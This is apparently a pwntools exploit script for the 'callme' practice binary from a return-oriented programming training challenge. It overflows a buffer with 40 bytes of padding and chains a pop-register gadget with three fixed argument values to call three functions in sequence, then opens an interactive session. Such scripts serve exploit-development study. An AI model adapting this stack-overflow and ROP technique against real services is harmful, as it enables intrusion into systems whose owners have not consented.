#!/usr/bin/python3
from pwn import *
gs = '''
break pwnme
continue
'''
elf = context.binary = ELF('./callme')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./callme', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./callme')
r = start()
#========= exploit here ===================

args = ''
args += p64(0xdeadbeefdeadbeef)# args 
args += p64(0xcafebabecafebabe)# args 
args += p64(0xd00df00dd00df00d)# args
popargs = 0x401ab0 #pop rdi pop rsi pop rdx
#callme functions
callme1 = 0x401850
callme2 = 0x401870 
callme3 = 0x401810 
#ropchain
payload = "A"*40
payload += p64(popargs)
payload += args
payload += p64(callme1)
payload += p64(popargs)
payload += args
payload += p64(callme2)
payload += p64(popargs)
payload += args
payload += p64(callme3)


r.sendlineafter(">",payload)
#========= interactive ====================
r.interactive()
